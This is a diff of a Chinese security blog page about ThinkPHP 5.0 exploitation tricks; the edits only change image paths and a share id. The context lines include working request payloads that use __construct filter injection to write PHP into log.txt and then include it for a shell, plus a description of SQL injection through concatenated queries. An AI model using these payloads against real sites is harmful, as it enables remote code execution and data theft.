@@ -109,14 +109,14 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 文件日志</span><br><span class="line"> * @param        $content 要写入的内容</span><br><span class="line"> * @param string $file    日志文件,在web 入口目录</span><br><span class="line"> */</span><br><span class="line">function cmf_log($content, $file = &quot;log.txt&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    file_put_contents($file, $content, FILE_APPEND);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>明显的只要控制了 $context 参数就能写入任意内容</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=cmf_log&amp;get[]=&lt;?php phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
-<p><img src="/2019/04/10/Thinkphp-tips/E:/blog\source\_posts\inquesting\1.png" alt="1552482873149"></p>
+<p><img src="/2019/04/10/Thinkphp-tips/E:/blog\source\_posts\Thinkphp-tips\1.png" alt="1552482873149"></p>
 <p>直接在网站根目录创建了 log.txt ，并且追加写入了get[]的内容</p>
 <p>再使用文件包含的payload</p>
 <p>think\Loader.php </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * include</span><br><span class="line"> * @param  string $file 文件路径</span><br><span class="line"> * @return mixed</span><br><span class="line"> */</span><br><span class="line">function __include_file($file)</span><br><span class="line">&#123;</span><br><span class="line">    return include $file;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_method=__construct&amp;method=get&amp;filter[]=think\__include_file&amp;get[]=log.txt&amp;server=1</span><br></pre></td></tr></table></figure>
 <p>包含写入的恶意代码，即可getshell ！</p>
-<p><img src="/2019/04/10/Thinkphp-tips/E:/blog\source\_posts\inquesting\2.png" alt="1552483018923"></p>
+<p><img src="/2019/04/10/Thinkphp-tips/E:/blog\source\_posts\Thinkphp-tips\2.png" alt="1552483018923"></p>
 <p>0x03  <strong>案例2</strong></p>
 <p>环境 Thinkphp 5.0.11  开发</p>
 <p>启用了<em>disable_functions</em>和禁用assert的情况下，寻找 common.php 里面的公共函数搞事情(不只是common.php)</p>
@@ -126,7 +126,7 @@
 <p>找到其中一个函数，明显的SQL拼接。直接注入</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function getuidinfo($uid)</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        $readDB = Db::connect(&apos;db_config_read&apos;);</span><br><span class="line">        $ids=$readDB-&gt;query(&quot;SELECT id FROM user where  uid=&apos;&quot;. $uid .&quot;&apos;&quot;);</span><br><span class="line">        $r = array();</span><br><span class="line">        $r[&quot;money&quot;] = 0;</span><br><span class="line">        $r[&quot;count&quot;] = 0;</span><br><span class="line">        for ($i=0;$i&lt;count($ids);$i++)&#123;</span><br><span class="line">            $id = $ids[$i];</span><br><span class="line">            $rr = get($id[&apos;id&apos;]);</span><br><span class="line">            $r[&quot;money&quot;] = $r[&quot;money&quot;] + $rr[&quot;money&quot;];</span><br><span class="line">            $r[&quot;count&quot;] = $r[&quot;count&quot;] + $rr[&quot;count&quot;];</span><br><span class="line">        &#125;</span><br><span class="line">        return $r;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 <p>直接使用报错注入payload</p>
-<p><img src="/2019/04/10/Thinkphp-tips/E:/blog\source\_posts\inquesting\3.png" alt="1554865868137"></p>
+<p><img src="/2019/04/10/Thinkphp-tips/E:/blog\source\_posts\Thinkphp-tips\3.png" alt="1554865868137"></p>
 <p>后面就是直接SQLmap一把梭哈。</p>
 <p>0x03  <strong>总结</strong></p>
 <p> 还有更多的玩法等待着你来开发。</p>
@@ -134,7 +134,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://gmazing.github.io/2019/04/10/Thinkphp-tips/" data-id="cjuc9pp0k0000k8059svv0gl5" class="article-share-link">Share</a>
+      <a data-url="https://gmazing.github.io/2019/04/10/Thinkphp-tips/" data-id="cjuc9wd450002v0055opmvxqi" class="article-share-link">Share</a>
       
       
     </footer>
